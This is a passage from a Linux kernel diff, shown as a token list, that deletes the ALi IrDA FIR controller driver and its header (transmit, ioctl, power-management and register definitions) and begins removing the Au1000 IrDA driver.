">", "netdev", ";", "skb_reset_mac_header", "(", "skb", ")", ";", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IRDA", ")", ";", "netif_rx", "(", "skb", ")", ";", "}", "}", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "return", "TRUE", ";", "}", "/", "*", "*", "Function", "ali_ircc_sir_hard_xmit", "(", "skb", ",", "dev", ")", "*", "*", "Transmit", "the", "frame", "!", "*", "*", "/", "static", "netdev_tx_t", "ali_ircc_sir_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "ali_ircc_cb", "*", "self", ";", "unsigned", "long", "flags", ";", "int", "iobase", ";", "__u32", "speed", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "NETDEV_TX_OK", ";", ");", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "NETDEV_TX_OK", ";", ");", "iobase", "=", "self", "-", ">", "io", ".", "sir_base", ";", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "Make", "sure", "tests", "*", "&", "speed", "change", "are", "atomic", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Note", ":", "you", "should", "make", "sure", "that", "speed", "changes", "are", "not", "going", "*", "to", "corrupt", "any", "outgoing", "frame", ".", "Look", "at", "nsc", "-", "ircc", "for", "the", "gory", "*", "details", "-", "Jean", "II", "*", "/", "/", "*", "Check", "if", "we", "need", "to", "change", "the", "speed", "*", "/", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "if", "(", "(", "speed", "!", "=", "self", "-", ">", "io", ".", "speed", ")", "&", "&", "(", "speed", "!", "=", "-", "1", ")", ")", "{", "/", "*", "Check", "for", "empty", "frame", "*", "/", "if", "(", "!", "skb", "-", ">", "len", ")", "{", "ali_ircc_change_speed", "(", "self", ",", "speed", ")", ";", "netif_trans_update", "(", "dev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "else", "self", "-", ">", "new_speed", "=", "speed", ";", "}", "/", "*", "Init", "tx", "buffer", "*", "/", "self", "-", ">", "tx_buff", ".", "data", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "/", "*", "Copy", "skb", "to", "tx_buff", "while", "wrapping", ",", "stuffing", "and", "making", "CRC", "*", "/", "self", "-", ">", "tx_buff", ".", "len", "=", "async_wrap_skb", "(", "skb", ",", "self", "-", ">", "tx_buff", ".", "data", ",", "self", "-", ">", "tx_buff", ".", "truesize", ")", ";", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "self", "-", ">", "tx_buff", ".", "len", ";", "/", "*", "Turn", "on", "transmit", "finished", "interrupt", ".", "Will", "fire", "immediately", "!", "*", "/", "outb", "(", "UART_IER_THRI", ",", "iobase", "+", "UART_IER", ")", ";", "netif_trans_update", "(", "dev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "/", "*", "*", "Function", "ali_ircc_net_ioctl", "(", "dev", ",", "rq", ",", "cmd", ")", "*", "*", "Process", "IOCTL", "commands", "for", "this", "device", "*", "*", "/", "static", "int", "ali_ircc_net_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "irq", "=", "(", "struct", "if_irda_req", "*", ")", "rq", ";", "struct", "ali_ircc_cb", "*", "self", ";", "unsigned", "long", "flags", ";", "int", "ret", "=", "0", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", ",", "(", "cmd", "=", "0x", "%", "X", ")", "\\", "n", "\"", ",", "__func__", ",", "dev", "-", ">", "name", ",", "cmd", ")", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "/", "*", "Set", "bandwidth", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "SIOCSBANDWIDTH", "\\", "n", "\"", ",", "__func__", ")", ";", "/", "*", "*", "This", "function", "will", "also", "be", "used", "by", "IrLAP", "to", "change", "the", "*", "speed", ",", "so", "we", "still", "must", "allow", "for", "speed", "change", "within", "*", "interrupt", "context", ".", "*", "/", "if", "(", "!", "in_interrupt", "(", ")", "&", "&", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "ali_ircc_change_speed", "(", "self", ",", "irq", "-", ">", "ifr_baudrate", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "break", ";", "case", "SIOCSMEDIABUSY", ":", "/", "*", "Set", "media", "busy", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "SIOCSMEDIABUSY", "\\", "n", "\"", ",", "__func__", ")", ";", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "irda_device_set_media_busy", "(", "self", "-", ">", "netdev", ",", "TRUE", ")", ";", "break", ";", "case", "SIOCGRECEIVING", ":", "/", "*", "Check", "if", "we", "are", "receiving", "right", "now", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "SIOCGRECEIVING", "\\", "n", "\"", ",", "__func__", ")", ";", "/", "*", "This", "is", "protected", "*", "/", "irq", "-", ">", "ifr_receiving", "=", "ali_ircc_is_receiving", "(", "self", ")", ";", "break", ";", "default", ":", "ret", "=", "-", "EOPNOTSUPP", ";", "}", "return", "ret", ";", "}", "/", "*", "*", "Function", "ali_ircc_is_receiving", "(", "self", ")", "*", "*", "Return", "TRUE", "is", "we", "are", "currently", "receiving", "a", "frame", "*", "*", "/", "static", "int", "ali_ircc_is_receiving", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "unsigned", "long", "flags", ";", "int", "status", "=", "FALSE", ";", "int", "iobase", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "FALSE", ";", ");", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "{", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "if", "(", "(", "inb", "(", "iobase", "+", "FIR_FIFO_FR", ")", "&", "0x3f", ")", "!", "=", "0", ")", "{", "/", "*", "We", "are", "receiving", "something", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "We", "are", "receiving", "something", "\\", "n", "\"", ",", "__func__", ")", ";", "status", "=", "TRUE", ";", "}", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "}", "else", "{", "status", "=", "(", "self", "-", ">", "rx_buff", ".", "state", "!", "=", "OUTSIDE_FRAME", ")", ";", "}", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "return", "status", ";", "}", "static", "int", "ali_ircc_suspend", "(", "struct", "platform_device", "*", "dev", ",", "pm_message_t", "state", ")", "{", "struct", "ali_ircc_cb", "*", "self", "=", "platform_get_drvdata", "(", "dev", ")", ";", "net_info_ratelimited", "(", "\"%", "s", ",", "Suspending", "\\", "n", "\"", ",", "ALI_IRCC_DRIVER_NAME", ")", ";", "if", "(", "self", "-", ">", "io", ".", "suspended", ")", "return", "0", ";", "ali_ircc_net_close", "(", "self", "-", ">", "netdev", ")", ";", "self", "-", ">", "io", ".", "suspended", "=", "1", ";", "return", "0", ";", "}", "static", "int", "ali_ircc_resume", "(", "struct", "platform_device", "*", "dev", ")", "{", "struct", "ali_ircc_cb", "*", "self", "=", "platform_get_drvdata", "(", "dev", ")", ";", "if", "(", "!", "self", "-", ">", "io", ".", "suspended", ")", "return", "0", ";", "ali_ircc_net_open", "(", "self", "-", ">", "netdev", ")", ";", "net_info_ratelimited", "(", "\"%", "s", ",", "Waking", "up", "\\", "n", "\"", ",", "ALI_IRCC_DRIVER_NAME", ")", ";", "self", "-", ">", "io", ".", "suspended", "=", "0", ";", "return", "0", ";", "}", "/", "*", "ALi", "Chip", "Function", "*", "/", "static", "void", "SetCOMInterrupts", "(", "struct", "ali_ircc_cb", "*", "self", ",", "unsigned", "char", "enable", ")", "{", "unsigned", "char", "newMask", ";", "int", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "or", "sir_base", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "-", "--", "--", "--", "-", "Start", "-", "--", "--", "--", "-", "(", "Enable", "=", "%", "d", ")", "\\", "n", "\"", ",", "__func__", ",", "enable", ")", ";", "/", "*", "Enable", "the", "interrupt", "which", "we", "wish", "to", "*", "/", "if", "(", "enable", ")", "{", "if", "(", "self", "-", ">", "io", ".", "direction", "=", "=", "IO_XMIT", ")", "{", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "/", "*", "FIR", ",", "MIR", "*", "/", "{", "newMask", "=", "self", "-", ">", "ier", ";", "}", "else", "/", "*", "SIR", "*", "/", "{", "newMask", "=", "UART_IER_THRI", "|", "UART_IER_RDI", ";", "}", "}", "else", "{", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "/", "*", "FIR", ",", "MIR", "*", "/", "{", "newMask", "=", "self", "-", ">", "ier", ";", "}", "else", "/", "*", "SIR", "*", "/", "{", "newMask", "=", "UART_IER_RDI", ";", "}", "}", "}", "else", "/", "*", "Disable", "all", "the", "interrupts", "*", "/", "{", "newMask", "=", "0x00", ";", "}", "/", "/", "SIR", "and", "FIR", "has", "different", "registers", "if", "(", "self", "-", ">", "io", ".", "speed", ">", "115200", ")", "{", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "outb", "(", "newMask", ",", "iobase", "+", "FIR_IER", ")", ";", "}", "else", "outb", "(", "newMask", ",", "iobase", "+", "UART_IER", ")", ";", "}", "static", "void", "SIR2FIR", "(", "int", "iobase", ")", "{", "/", "/", "unsigned", "char", "tmp", ";", "/", "*", "Already", "protected", "(", "change_speed", "(", ")", "or", "setup", "(", "))", ",", "no", "need", "to", "lock", ".", "*", "Jean", "II", "*", "/", "outb", "(", "0x28", ",", "iobase", "+", "UART_MCR", ")", ";", "outb", "(", "0x68", ",", "iobase", "+", "UART_MCR", ")", ";", "outb", "(", "0x88", ",", "iobase", "+", "UART_MCR", ")", ";", "outb", "(", "0x60", ",", "iobase", "+", "FIR_MCR", ")", ";", "/", "*", "Master", "Reset", "*", "/", "outb", "(", "0x20", ",", "iobase", "+", "FIR_MCR", ")", ";", "/", "*", "Master", "Interrupt", "Enable", "*", "/", "/", "/", "tmp", "=", "inb", "(", "iobase", "+", "FIR_LCR_B", ")", ";", "/", "*", "SIP", "enable", "*", "/", "/", "/", "tmp", "|", "=", "0x20", ";", "/", "/", "outb", "(", "tmp", ",", "iobase", "+", "FIR_LCR_B", ")", ";", "}", "static", "void", "FIR2SIR", "(", "int", "iobase", ")", "{", "unsigned", "char", "val", ";", "/", "*", "Already", "protected", "(", "change_speed", "(", ")", "or", "setup", "(", "))", ",", "no", "need", "to", "lock", ".", "*", "Jean", "II", "*", "/", "outb", "(", "0x20", ",", "iobase", "+", "FIR_MCR", ")", ";", "/", "*", "IRQ", "to", "low", "*", "/", "outb", "(", "0x00", ",", "iobase", "+", "UART_IER", ")", ";", "outb", "(", "0xA0", ",", "iobase", "+", "FIR_MCR", ")", ";", "/", "*", "Don", "'", "t", "set", "master", "reset", "*", "/", "outb", "(", "0x00", ",", "iobase", "+", "UART_FCR", ")", ";", "outb", "(", "0x07", ",", "iobase", "+", "UART_FCR", ")", ";", "val", "=", "inb", "(", "iobase", "+", "UART_RX", ")", ";", "val", "=", "inb", "(", "iobase", "+", "UART_LSR", ")", ";", "val", "=", "inb", "(", "iobase", "+", "UART_MSR", ")", ";", "}", "MODULE_AUTHOR", "(", "\"", "Benjamin", "Kong", "<", "benjamin_kong", "@", "ali", ".", "com", ".", "tw", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "ALi", "FIR", "Controller", "Driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "platform", ":", "\"", "ALI_IRCC_DRIVER_NAME", ")", ";", "module_param_hw_array", "(", "io", ",", "int", ",", "ioport", ",", "NULL", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "io", ",", "\"", "Base", "I", "/", "O", "addresses", "\"", ");", "module_param_hw_array", "(", "irq", ",", "int", ",", "irq", ",", "NULL", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "irq", ",", "\"", "IRQ", "lines", "\"", ");", "module_param_hw_array", "(", "dma", ",", "int", ",", "dma", ",", "NULL", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "dma", ",", "\"", "DMA", "channels", "\"", ");", "module_init", "(", "ali_ircc_init", ")", ";", "module_exit", "(", "ali_ircc_cleanup", ")", ";", "@", "@", "-", "1", ",", "227", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "ali", "-", "ircc", ".", "h", "*", "Version", ":", "0", ".", "5", "*", "Description", ":", "Driver", "for", "the", "ALI", "M1535D", "and", "M1543C", "FIR", "Controller", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "Benjamin", "Kong", "<", "benjamin_kong", "@", "ali", ".", "com", ".", "tw", ">", "*", "Created", "at", ":", "2000", "/", "10", "/", "16", "03", ":", "46PM", "*", "Modified", "at", ":", "2001", "/", "1", "/", "3", "02", ":", "56PM", "*", "Modified", "by", ":", "Benjamin", "Kong", "<", "benjamin_kong", "@", "ali", ".", "com", ".", "tw", ">", "*", "*", "Copyright", "(", "c", ")", "2000", "Benjamin", "Kong", "<", "benjamin_kong", "@", "ali", ".", "com", ".", "tw", ">", "*", "All", "Rights", "Reserved", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "ifndef", "ALI_IRCC_H", "#", "define", "ALI_IRCC_H", "#", "include", "<", "linux", "/", "ktime", ".", "h", ">", "#", "include", "<", "linux", "/", "spinlock", ".", "h", ">", "#", "include", "<", "linux", "/", "pm", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "asm", "/", "io", ".", "h", ">", "/", "*", "SIR", "Register", "*", "/", "/", "*", "Usr", "definition", "of", "linux", "/", "serial_reg", ".", "h", "*", "/", "/", "*", "FIR", "Register", "*", "/", "#", "define", "BANK0", "0x20", "#", "define", "BANK1", "0x21", "#", "define", "BANK2", "0x22", "#", "define", "BANK3", "0x23", "#", "define", "FIR_MCR", "0x07", "/", "*", "Master", "Control", "Register", "*", "/", "/", "*", "Bank", "0", "*", "/", "#", "define", "FIR_DR", "0x00", "/", "*", "Alias", "0", ",", "FIR", "Data", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_IER", "0x01", "/", "*", "Alias", "1", ",", "FIR", "Interrupt", "Enable", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_IIR", "0x02", "/", "*", "Alias", "2", ",", "FIR", "Interrupt", "Identification", "Register", "(", "Read", "only", ")", "*", "/", "#", "define", "FIR_LCR_A", "0x03", "/", "*", "Alias", "3", ",", "FIR", "Line", "Control", "Register", "A", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_LCR_B", "0x04", "/", "*", "Alias", "4", ",", "FIR", "Line", "Control", "Register", "B", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_LSR", "0x05", "/", "*", "Alias", "5", ",", "FIR", "Line", "Status", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_BSR", "0x06", "/", "*", "Alias", "6", ",", "FIR", "Bus", "Status", "Register", "(", "Read", "only", ")", "*", "/", "/", "*", "Alias", "1", "*", "/", "#", "define", "IER_FIFO", "0x10", "/", "*", "FIR", "FIFO", "Interrupt", "Enable", "*", "/", "#", "define", "IER_TIMER", "0x20", "/", "*", "Timer", "Interrupt", "Enable", "*", "/", "#", "define", "IER_EOM", "0x40", "/", "*", "End", "of", "Message", "Interrupt", "Enable", "*", "/", "#", "define", "IER_ACT", "0x80", "/", "*", "Active", "Frame", "Interrupt", "Enable", "*", "/", "/", "*", "Alias", "2", "*", "/", "#", "define", "IIR_FIFO", "0x10", "/", "*", "FIR", "FIFO", "Interrupt", "*", "/", "#", "define", "IIR_TIMER", "0x20", "/", "*", "Timer", "Interrupt", "*", "/", "#", "define", "IIR_EOM", "0x40", "/", "*", "End", "of", "Message", "Interrupt", "*", "/", "#", "define", "IIR_ACT", "0x80", "/", "*", "Active", "Frame", "Interrupt", "*", "/", "/", "*", "Alias", "3", "*", "/", "#", "define", "LCR_A_FIFO_RESET", "0x80", "/", "*", "FIFO", "Reset", "*", "/", "/", "*", "Alias", "4", "*", "/", "#", "define", "LCR_B_BW", "0x10", "/", "*", "Brick", "Wall", "*", "/", "#", "define", "LCR_B_SIP", "0x20", "/", "*", "SIP", "Enable", "*", "/", "#", "define", "LCR_B_TX_MODE", "0x40", "/", "*", "Transmit", "Mode", "*", "/", "#", "define", "LCR_B_RX_MODE", "0x80", "/", "*", "Receive", "Mode", "*", "/", "/", "*", "Alias", "5", "*", "/", "#", "define", "LSR_FIR_LSA", "0x00", "/", "*", "FIR", "Line", "Status", "Address", "*", "/", "#", "define", "LSR_FRAME_ABORT", "0x08", "/", "*", "Frame", "Abort", "*", "/", "#", "define", "LSR_CRC_ERROR", "0x10", "/", "*", "CRC", "Error", "*", "/", "#", "define", "LSR_SIZE_ERROR", "0x20", "/", "*", "Size", "Error", "*", "/", "#", "define", "LSR_FRAME_ERROR", "0x40", "/", "*", "Frame", "Error", "*", "/", "#", "define", "LSR_FIFO_UR", "0x80", "/", "*", "FIFO", "Underrun", "*", "/", "#", "define", "LSR_FIFO_OR", "0x80", "/", "*", "FIFO", "Overrun", "*", "/", "/", "*", "Alias", "6", "*", "/", "#", "define", "BSR_FIFO_NOT_EMPTY", "0x80", "/", "*", "FIFO", "Not", "Empty", "*", "/", "/", "*", "Bank", "1", "*", "/", "#", "define", "FIR_CR", "0x00", "/", "*", "Alias", "0", ",", "FIR", "Configuration", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_FIFO_TR", "0x01", "/", "*", "Alias", "1", ",", "FIR", "FIFO", "Threshold", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_DMA_TR", "0x02", "/", "*", "Alias", "2", ",", "FIR", "DMA", "Threshold", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_TIMER_IIR", "0x03", "/", "*", "Alias", "3", ",", "FIR", "Timer", "interrupt", "interval", "register", "(", "W", "/", "O", ")", "*", "/", "#", "define", "FIR_FIFO_FR", "0x03", "/", "*", "Alias", "3", ",", "FIR", "FIFO", "Flag", "register", "(", "R", "/", "O", ")", "*", "/", "#", "define", "FIR_FIFO_RAR", "0x04", "/", "*", "Alias", "4", ",", "FIR", "FIFO", "Read", "Address", "register", "(", "R", "/", "O", ")", "*", "/", "#", "define", "FIR_FIFO_WAR", "0x05", "/", "*", "Alias", "5", ",", "FIR", "FIFO", "Write", "Address", "register", "(", "R", "/", "O", ")", "*", "/", "#", "define", "FIR_TR", "0x06", "/", "*", "Alias", "6", ",", "Test", "REgister", "(", "W", "/", "O", ")", "*", "/", "/", "*", "Alias", "0", "*", "/", "#", "define", "CR_DMA_EN", "0x01", "/", "*", "DMA", "Enable", "*", "/", "#", "define", "CR_DMA_BURST", "0x02", "/", "*", "DMA", "Burst", "Mode", "*", "/", "#", "define", "CR_TIMER_EN", "0x08", "/", "*", "Timer", "Enable", "*", "/", "/", "*", "Alias", "3", "*", "/", "#", "define", "TIMER_IIR_500", "0x00", "/", "*", "500", "us", "*", "/", "#", "define", "TIMER_IIR_1ms", "0x01", "/", "*", "1", "ms", "*", "/", "#", "define", "TIMER_IIR_2ms", "0x02", "/", "*", "2", "ms", "*", "/", "#", "define", "TIMER_IIR_4ms", "0x03", "/", "*", "4", "ms", "*", "/", "/", "*", "Bank", "2", "*", "/", "#", "define", "FIR_IRDA_CR", "0x00", "/", "*", "Alias", "0", ",", "IrDA", "Control", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_BOF_CR", "0x01", "/", "*", "Alias", "1", ",", "BOF", "Count", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_BW_CR", "0x02", "/", "*", "Alias", "2", ",", "Brick", "Wall", "Count", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_TX_DSR_HI", "0x03", "/", "*", "Alias", "3", ",", "TX", "Data", "Size", "Register", "(", "high", ")", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_TX_DSR_LO", "0x04", "/", "*", "Alias", "4", ",", "TX", "Data", "Size", "Register", "(", "low", ")", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_RX_DSR_HI", "0x05", "/", "*", "Alias", "5", ",", "RX", "Data", "Size", "Register", "(", "high", ")", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_RX_DSR_LO", "0x06", "/", "*", "Alias", "6", ",", "RX", "Data", "Size", "Register", "(", "low", ")", "(", "R", "/", "W", ")", "*", "/", "/", "*", "Alias", "0", "*", "/", "#", "define", "IRDA_CR_HDLC1152", "0x80", "/", "*", "1", ".", "152Mbps", "HDLC", "Select", "*", "/", "#", "define", "IRDA_CR_CRC", "0X40", "/", "*", "CRC", "Select", ".", "*", "/", "#", "define", "IRDA_CR_HDLC", "0x20", "/", "*", "HDLC", "select", ".", "*", "/", "#", "define", "IRDA_CR_HP_MODE", "0x10", "/", "*", "HP", "mode", "(", "read", "only", ")", "*", "/", "#", "define", "IRDA_CR_SD_ST", "0x08", "/", "*", "SD", "/", "MODE", "State", ".", "*", "/", "#", "define", "IRDA_CR_FIR_SIN", "0x04", "/", "*", "FIR", "SIN", "Select", ".", "*", "/", "#", "define", "IRDA_CR_ITTX_0", "0x02", "/", "*", "SOUT", "State", ".", "IRTX", "force", "to", "0", "*", "/", "#", "define", "IRDA_CR_ITTX_1", "0x03", "/", "*", "SOUT", "State", ".", "IRTX", "force", "to", "1", "*", "/", "/", "*", "Bank", "3", "*", "/", "#", "define", "FIR_ID_VR", "0x00", "/", "*", "Alias", "0", ",", "FIR", "ID", "Version", "Register", "(", "R", "/", "O", ")", "*", "/", "#", "define", "FIR_MODULE_CR", "0x01", "/", "*", "Alias", "1", ",", "FIR", "Module", "Control", "Register", "(", "R", "/", "W", ")", "*", "/", "#", "define", "FIR_IO_BASE_HI", "0x02", "/", "*", "Alias", "2", ",", "FIR", "Higher", "I", "/", "O", "Base", "Address", "Register", "(", "R", "/", "O", ")", "*", "/", "#", "define", "FIR_IO_BASE_LO", "0x03", "/", "*", "Alias", "3", ",", "FIR", "Lower", "I", "/", "O", "Base", "Address", "Register", "(", "R", "/", "O", ")", "*", "/", "#", "define", "FIR_IRQ_CR", "0x04", "/", "*", "Alias", "4", ",", "FIR", "IRQ", "Channel", "Register", "(", "R", "/", "O", ")", "*", "/", "#", "define", "FIR_DMA_CR", "0x05", "/", "*", "Alias", "5", ",", "FIR", "DMA", "Channel", "Register", "(", "R", "/", "O", ")", "*", "/", "struct", "ali_chip", "{", "char", "*", "name", ";", "int", "cfg", "[", "2", "]", ";", "unsigned", "char", "entr1", ";", "unsigned", "char", "entr2", ";", "unsigned", "char", "cid_index", ";", "unsigned", "char", "cid_value", ";", "int", "(", "*", "probe", ")", "(", "struct", "ali_chip", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "int", "(", "*", "init", ")", "(", "struct", "ali_chip", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "}", ";", "typedef", "struct", "ali_chip", "ali_chip_t", ";", "/", "*", "DMA", "modes", "needed", "*", "/", "#", "define", "DMA_TX_MODE", "0x08", "/", "*", "Mem", "to", "I", "/", "O", ",", "+", "+,", "demand", ".", "*", "/", "#", "define", "DMA_RX_MODE", "0x04", "/", "*", "I", "/", "O", "to", "mem", ",", "+", "+,", "demand", ".", "*", "/", "#", "define", "MAX_TX_WINDOW", "7", "#", "define", "MAX_RX_WINDOW", "7", "#", "define", "TX_FIFO_Threshold", "8", "#", "define", "RX_FIFO_Threshold", "1", "#", "define", "TX_DMA_Threshold", "1", "#", "define", "RX_DMA_Threshold", "1", "/", "*", "For", "storing", "entries", "in", "the", "status", "FIFO", "*", "/", "struct", "st_fifo_entry", "{", "int", "status", ";", "int", "len", ";", "}", ";", "struct", "st_fifo", "{", "struct", "st_fifo_entry", "entries", "[", "MAX_RX_WINDOW", "]", ";", "int", "pending_bytes", ";", "int", "head", ";", "int", "tail", ";", "int", "len", ";", "}", ";", "struct", "frame_cb", "{", "void", "*", "start", ";", "/", "*", "Start", "of", "frame", "in", "DMA", "mem", "*", "/", "int", "len", ";", "/", "*", "Length", "of", "frame", "in", "DMA", "mem", "*", "/", "}", ";", "struct", "tx_fifo", "{", "struct", "frame_cb", "queue", "[", "MAX_TX_WINDOW", "]", ";", "/", "*", "Info", "about", "frames", "in", "queue", "*", "/", "int", "ptr", ";", "/", "*", "Currently", "being", "sent", "*", "/", "int", "len", ";", "/", "*", "Length", "of", "queue", "*", "/", "int", "free", ";", "/", "*", "Next", "free", "slot", "*", "/", "void", "*", "tail", ";", "/", "*", "Next", "free", "start", "in", "DMA", "mem", "*", "/", "}", ";", "/", "*", "Private", "data", "for", "each", "instance", "*", "/", "struct", "ali_ircc_cb", "{", "struct", "st_fifo", "st_fifo", ";", "/", "*", "Info", "about", "received", "frames", "*", "/", "struct", "tx_fifo", "tx_fifo", ";", "/", "*", "Info", "about", "frames", "to", "be", "transmitted", "*", "/", "struct", "net_device", "*", "netdev", ";", "/", "*", "Yes", "!", "we", "are", "some", "kind", "of", "netdevice", "*", "/", "struct", "irlap_cb", "*", "irlap", ";", "/", "*", "The", "link", "layer", "we", "are", "binded", "to", "*", "/", "struct", "qos_info", "qos", ";", "/", "*", "QoS", "capabilities", "for", "this", "device", "*", "/", "chipio_t", "io", ";", "/", "*", "IrDA", "controller", "information", "*", "/", "iobuff_t", "tx_buff", ";", "/", "*", "Transmit", "buffer", "*", "/", "iobuff_t", "rx_buff", ";", "/", "*", "Receive", "buffer", "*", "/", "dma_addr_t", "tx_buff_dma", ";", "dma_addr_t", "rx_buff_dma", ";", "__u8", "ier", ";", "/", "*", "Interrupt", "enable", "register", "*", "/", "__u8", "InterruptID", ";", "/", "*", "Interrupt", "ID", "*", "/", "__u8", "BusStatus", ";", "/", "*", "Bus", "Status", "*", "/", "__u8", "LineStatus", ";", "/", "*", "Line", "Status", "*", "/", "unsigned", "char", "rcvFramesOverflow", ";", "ktime_t", "stamp", ";", "spinlock_t", "lock", ";", "/", "*", "For", "serializing", "operations", "*", "/", "__u32", "new_speed", ";", "int", "index", ";", "/", "*", "Instance", "index", "*", "/", "unsigned", "char", "fifo_opti_buf", ";", "}", ";", "static", "inline", "void", "switch_bank", "(", "int", "iobase", ",", "int", "bank", ")", "{", "outb", "(", "bank", ",", "iobase", "+", "FIR_MCR", ")", ";", "}", "#", "endif", "/", "*", "ALI_IRCC_H", "*", "/", "@", "@", "-", "1", ",", "985", "+", "0", ",", "0", "@", "@", "/", "*", "*", "Alchemy", "Semi", "Au1000", "IrDA", "driver", "*", "*", "Copyright", "2001", "MontaVista", "Software", "Inc", ".", "*", "Author", ":", "MontaVista", "Software", ",", "Inc", ".", "*", "ppopov", "@", "mvista", ".", "com", "or", "source", "@", "mvista", ".", "com", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "distribute", "it", "and", "/", "or", "modify", "it", "*", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "(", "Version", "2", ")", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "it", "will", "be", "useful", ",", "but", "WITHOUT", "*", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "MERCHANTABILITY", "or", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "GNU", "General", "Public", "License", "*", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "along", "*", "with", "this", "program", ";", "if", "not", ",", "see", "<", "http", ":", "//", "www", ".", "gnu", ".", "org", "/", "licenses", "/", ">.", "*", "/", "#", "include", "<", "linux", "/", "clk", ".", "h", ">", "#", "include", "<", "linux", 